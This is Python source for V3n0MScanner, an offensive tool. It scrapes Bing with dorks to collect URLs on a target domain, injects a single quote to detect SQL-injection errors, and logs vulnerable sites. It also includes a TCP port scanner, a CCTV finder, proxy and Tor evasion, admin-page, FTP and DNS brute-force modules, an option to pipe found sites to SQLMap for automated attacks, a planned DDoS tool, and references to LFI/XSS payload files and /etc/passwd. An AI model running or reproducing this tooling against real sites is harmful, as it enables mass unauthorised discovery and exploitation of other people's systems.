#!/usr/bin/python
# -*- coding: latin-1 -*-
#              --- To be Done     --Partially implemented     -Done
# V3n0MScanner.py - V.4.0.4b2
#   - Redo entire search engine function to run 100 checks per engine at once
#   - Change layout and add a timer feature
#   --- Re-Add LFI/RFI options
#   --- Add parsing options
#   --- add piping for SQLMap
#   - Add scans for known Metasploitable Vulns (* dork based and Nmap style *)
#   - Add a keyboard escape to menu
#   -- Recode admin page finder, go for asyncio based crawler.
#   - Asyncio Dork Scanning method. Stage 1 Done,
#   -- Asyncio Dork Scanning Stage 2, Returning 15 seperate engines at once
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni


try:
    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, codecs
    from signal import SIGINT, signal
    from codecs import lookup, register
    from random import SystemRandom
    from socket import *
    from datetime import *

except:
    print(" please make sure you have all of the following modules: asyncio, aiohttp, codecs, requests")
    print(" httplib2, signal, itertools")
    print("Error a module was not found,  'sudo pip3 install <package name>' to install")
    exit()


# Banner
def logo():
    print(R + "\n|----------------------------------------------------------------|")
    print("|     V3n0mScanner.py                                            |")
    print("|     Release Date 11/04/2016  - Release Version V.4.0.4b3        |")
    print("|         Socks4&5 Proxy Support                                 |")
    print("|             " + B + "        NovaCygni  Architect    " + R + "                   |")
    print("|                    _____       _____                           |")
    print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
    print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
    print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
    print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |")
    print("|                                                                |")
    print("|----------------------------------------------------------------|\n")


def killpid(signum=0, frame=0):
    print("\r\x1b[K")
    os.kill(os.getpid(), 9)


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


# Apoligies for this ugly section of code
# It is just a placeholder
# So dont worry, itll be replaced soon enough
def classicinj(url):
    aug_url = url + "'"
    try:
        try:
            resp = urllib.request.urlopen(aug_url)
            cctvcheck = urllib.request.urlopen(url)
            Hits = str(resp.read())
            tango = str(cctvcheck.read())
            if str("error in your SQL syntax") in Hits:
                print(url + " is vulnerable --> MySQL Classic")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("mysql_fetch") in Hits:
                print(url + " is Vulnerable --> MiscError")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("num_rows") in Hits:
                print(url + " is Vulnerable --> MiscError2")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("ORA-01756") in Hits:
                print(url + " is Vulnerable --> Oracle")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Error Executing Database Query") in Hits:
                print(url + " is Vulnerable --> JDBC_CFM")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("SQLServer JDBC Driver") in Hits:
                print(url + " is Vulnerable --> JDBC_CFM2")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("OLE DB Provider for SQL Server") in Hits:
                print(url + " is Vulnerable --> MSSQL_OLEdb")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Unclosed quotation mark") in Hits:
                print(url + " is Vulnerabe --> MSSQL_Uqm")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("ODBC Microsoft Access Driver") in Hits:
                print(url + " is Vulnerable --> MS-Access_ODBC")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Microsoft JET Database") in Hits:
                print(url + " is Vulnerable --> MS-Access_JETdb")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Error Occurred While Processing Request") in Hits:
                print(url + " is Vulnerable --> Processing Request")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Microsoft JET Database") in Hits:
                print(url + " is Vulnerable --> MS-Access JetDb")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Error Occurred While Processing Request") in Hits:
                print(url + " is Vulnerable --> Processing Request ")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Server Error") in Hits:
                print(url + " is Vulnerable --> Server Error")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("ODBC Drivers error") in Hits:
                print(url + " is Vulnerable --> ODBC Drivers error")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Invalid Querystring") in Hits:
                print(url + " is Vulnerable --> Invalid Querystring")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("OLE DB Provider for ODBC") in Hits:
                print(url + " is Vulnerable --> OLE DB Provider for ODBC")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("VBScript Runtime") in Hits:
                print(url + " is Vulnerable --> VBScript Runtime")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("ADODB.Field") in Hits:
                print(url + " is Vulnerable --> ADODB.Field")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("BOF or EOF") in Hits:
                print(url + " is Vulnerable --> BOF or EOF")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("ADODB.Command") in Hits:
                print(url + " is Vulnerable --> ADODB.Command")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("JET Database") in Hits:
                print(url + " is Vulnerable --> JET Database")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("mysql_fetch_array") in Hits:
                print(url + " is Vulnerabe --> mysql_fetch_array")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Syntax error") in Hits:
                print(url + " is Vulnerable --> Syntax error")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("mysql_numrows()") in Hits:
                print(url + " is Vulnerable --> mysql_numrows()")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("GetArray()") in Hits:
                print(url + " is Vulnerable --> GetArray()")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("FetchRow()") in Hits:
                print(url + " is Vulnerable --> FetchRow()")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("Input string was not in a correct format") in Hits:
                print(url + " is Vulnerable --> Input String Error")
                logfile.write("\n" + aug_url)
                vuln.append(Hits)
                col.append(Hits)
                pass
            elif str("CCTV") in tango:
                print(url + "  CCTV Discovered!!!")
            else:
                pass
        except:
           pass
    except KeyboardInterrupt:
        chce = ':'
        os.system('clear')
        logo()
        print( G + "Program Paused" + R)
        time.sleep(1)
        print('[1] Unpause Program')
        print('[2] Skip the rest of SQLi check, Save list and Return to Main Menu')
        print('[3] Pipe all found vulns to SQLMap to Automate SQLi attacks.')
        print('[4] Return to Main Menu')
        if chce == '1':
            return
        if chce == '2':
            os.system('clear')
            logo()
            print("\r\x1b[K [*] Scan complete, " + str(len(col)) + " vuln sites found.")
        if chce == '4':
            os.system('clear')
            fmenu()
        else:
            pass
    else:
        pass




def injtest():
    global logfile
    log = "v3n0m-sqli.txt"
    logfile = open(log, "a")
    print(B + "\n[+] Preparing for SQLi scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = Injthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


def fscan():
    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks

    threads = []
    finallist = []
    finallist2 = []
    col = []
    darkurl = []
    loaded_Dorks = []

    print(W)
    sites = input("\nChoose your target(domain) ie .com  : ")
    sitearray = [sites]

    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            loaded_Dorks.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            loaded_Dorks.append(d0rk[i])
            i += 1
        for g in loaded_Dorks:
            print("dork: = ", g)
    numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
    pages_pulled_as_one = input('Enter no. of Search Engine Pages \n'
                                'to be scanned per d0rk, Between 20 and 100   : ')
    print("\nNumber of SQL errors :", "26")
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    print("Timeout         :", timeout)
    loop = asyncio.get_event_loop()
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    vulnscan()

#async def cloud():
#    try:
#        try:



def det_Neph():
    print("")


def det_Honeyd():
    print("")


def det_Kippo():
    print("")


def vulnscan():
    try:
        global endsub
        global vuln
        endsub = 0
        print(R + "\n[1] SQLi Testing")
        print("[2] Back to main menu")
        chce = input(":")
        if chce == '1':
            vuln = []
            injtest()
            print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
            print()
        elif chce == '1':
            vuln = []
            injtest()
            endsub = 0
            print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        elif chce == '2':
            endsub = 1
            fmenu()
    except Exception:
        logo()
        print( W + "Something went wrong, did you enter a invalid option???" + R )
        time.sleep(4)
        vulnscan()


holder_ips = ["192.168.0.{}".format(i) for i in range(1, 255)]
holder_ports = ["{}".format(i) for i in range(1, 36500)]
ips = [holder_ips]
ports = [holder_ports]


def tcp_Scanner_run(tasks, *, loop=None):
    if loop is None:
        loop = asyncio.get_event_loop()
        # waiting
    return loop.run_until_complete(asyncio.wait(tasks))


async def tcp_scanner(ip, port, loop=None):
    fut = asyncio.open_connection(ip, port, loop=loop)
    try:
        await asyncio.wait_for(fut, timeout=0.5)
        print("{}:{} Connected".format(ip, port))
    except asyncio.TimeoutError:
        pass
    except Exception as exc:
        print('Error {}:{} {}'.format(ip, port, exc))


def tcp_scan(ips, ports, randomize=True):
    loop = asyncio.get_event_loop()
    if randomize:
        rdev = SystemRandom()
        ips = rdev.shuffle(ips)
        ports = rdev.shuffle(ports)

    tcp_Scanner_run(tcp_scanner(ip, port) for port in ports for ip in ips)


def ignoringGet(url):
    try:
        try:
            responce = requests.get(url)
            responce.raise_for_status()
        except Exception:
            return ''
        return responce.text
    except KeyboardInterrupt:
        os.system('clear')
        chce1 = ':'
        logo()
        print( G + "Program Paused" + R )
        time.sleep(3)
        print("[1] Unpause")
        print("[2] Skip rest of scan and Continue with current results")
        print("[3] Return to main menu")
        if chce1 == "1":
            return
        if chce1 == "2":
            vulnscan()
        if chce1 == "3":
            fmenu()
        else:
            pass

async def search(pages_pulled_as_one):
    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        dark = 0
        for dork in loaded_Dorks:
            dark += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + "+site:" + site
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(10):
                    results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                        (page + i) * 50 + 1) + "&count=50"
                    futures.append(loop.run_in_executor(None, ignoringGet, results_web))
                page += 10
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)",name)
                    if (basename == None) or any([x.strip() in name for x in search_Ignore.splitlines(keepends=True)]):
                        basename = re.search(r"(?<=://).*", name)
                    if basename != None:
                        basename = basename.group(0)
                    if basename not in domains and basename != None:
                        domains.add(basename)
                        urls.append(name)
                darklen = len(loaded_Dorks)
                percent = int((1.0 * dark / int(darklen)) * 100)
                urls_len = len(urls)
                os.system('clear')
                start_time = datetime.now()
                timeduration = start_time - timestart
                sys.stdout.flush()
                logo()
                sys.stdout.write( W +
                    "\r\x1b[K " + R + "| Domain: <%s> Has been targeted\n "
                    "| Collected urls: %s Since start of scan \n"
                    " | D0rks: %s/%s Progressed so far \n"
                    " | Percent Done: %s \n"
                    " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
                    " | Dork In Progress: %s\n"
                    " | Elapsed Time: %s\n"%(  R +
                        site, repr(urls_len), dark, darklen, repr(percent), repr(page), dork, timeduration))
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []
    print("\n\n[+] URLS (unsorted): ", len(urls))
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)
        except KeyboardInterrupt:
            os.system('clear')
            chce1 = ':'
            logo()
            print(G + "Program Paused" + R)
            time.sleep(3)
            print("[1] Unpause")
            print("[2] Skip rest of scan and Continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                vulnscan()
            if chce1 == "3":
                fmenu()
            else:
                pass
            continue
    print("[+] URLS (sorted)  : ", len(finallist))
    return finallist




def fmenu():
    global vuln
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and vuln scan")
    print("[2] Admin page finder")
    print("[3] FTP crawler and vuln scan")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[6] Misc Options")
    print("[0] Exit\n")
    chce = input(":")

    if chce == '1':
        print(W + "")
        fscan()

    elif chce == '2':
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite),
                                     shell=True)
        findadmin.communicate()
        subprocess._cleanup()

    elif chce == '3':
        randips = input("How many IP addresses do you want to scan: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
        ftpcrawl.communicate()
        subprocess._cleanup()

    elif chce == '4':
        dnstarg = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg),
                                    shell=True)
        dnsbrute.communicate()
        subprocess._cleanup()

    elif chce == '5':
        print(W + "")
        enable_proxy()

    elif chce == '0':
        print(R + "\n Exiting ...")
        print(W)
        sys.exit(0)

    elif chce == '6':
        print(W + "")
        os.system('clear')
        logo()
        print("[1] Skip to custom SQLi list checking")
        print("[2] Cloudflare IP Resolver ::= Next Release")
        print("[3] Identify Hash ::= Next Release")
        print("[4] SockStress DDoS Tool ::= Next Release")
        print("[0] Return to main menu")
        chce2 = input(":")
        if chce2 == '1':
            os.system('clear')
            logo()
            try:
                url = [line.strip() for line in open(input("Please Input Custom List Path \n"
                                                       "ie> \n"
                                                       " /home/user/Desktop/samples.txt \n"
                                                       "\n :    :"))]
                classicinj(url)
            except:
                os.system('clear')
                logo()
                print("Target file not found!")
                time.sleep(3)
                os.system('clear')
                fmenu()
        elif chce2 == '2':
            os.system('clear')
            logo()
#            cloud()
        elif chce2 == '0':
            fmenu()

signal(SIGINT, killpid)
d0rk = [line.strip() for line in open("statics/d0rks", 'r', encoding='utf-8')]
header = [line.strip() for line in open("statics/header", 'r')]
xsses = [line.strip() for line in open("statics/xsses", 'r')]
lfis = [line.strip() for line in open("statics/lfi", 'r')]
search_Ignore = str(line.strip() for line in open("statics/search_ignore", 'r', encoding='utf-8'))
random.shuffle(d0rk)
random.shuffle(header)
random.shuffle(lfis)
ProxyEnabled = False
parser = argparse.ArgumentParser(prog='v3n0m', usage='v3n0m [options]')
parser.add_argument('-p', "--proxy", type=str, help='Proxy must be in the form of type:host:port')
args = parser.parse_args()


def enable_proxy():
    try:
        print("Please select Proxy Type - Options = socks4, socks5 ")
        requiresID = str(input("Requires Username/Password? Type True or False"))
        proxytype = input()
        print(" Please enter Proxy IP address - ie. 127.0.0.66")
        proxyip = input(int)
        print(" Please enter Proxy Port - ie. 1076")
        proxyport = input(int)
        if proxytype == str("socks4"):
            if requiresID == str("True"):
                try:
                   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport,
                                         username=input("Proxy Account Username :"),
                                         password=input("Proxy Account Password  :"))
                   socket.socket = socks.socksocket
                   print(" Socks 4 Proxy Support Enabled")
                   time.sleep(3)
                except Exception:
                    print("Something went wrong setting the proxy please sumbit a bug report Code:0x05")
                    pass
            elif requiresID == str("False"):
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
                    socket.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    time.sleep(3)
                except Exception:
                    print("Something went wrong setting the proxy please sumbit a bug report Code:0x04")
                    pass
        elif proxytype == str("socks5"):
            if requiresID == str("True"):
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport,
                                          username=input("Proxy Account Username :"),
                                          password=input("Proxy Account Password"))
                    socket.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    time.sleep(3)
                except Exception:
                    print("Something went wrong setting the proxy please sumbit a bug report Code:0x03")
                    pass
            elif requiresID == str("False"):
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                    socket.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    time.sleep(3)
                except Exception:
                    print("Something went wrong setting the proxy please sumbit a bug report Code:0x02")
                    pass
    except Exception:
        print("Something went wrong setting the proxy please sumbit a bug report Code:0x01")
        pass


# This is the updated MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni

try:
    codecs.lookup('mbcs')
except LookupError:
    ascii_encoding = codecs.lookup('latin-1')
    def mbcs_bypass(name, encoding=ascii_encoding):
        if name == "mbcs":
            return encoding
    codecs.register(mbcs_bypass)


# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"


subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60  # Change this at your will
endsub = 1
gets = 0
timeout = 8
file = "/etc/passwd"

menu = True

while True:
    fmenu()
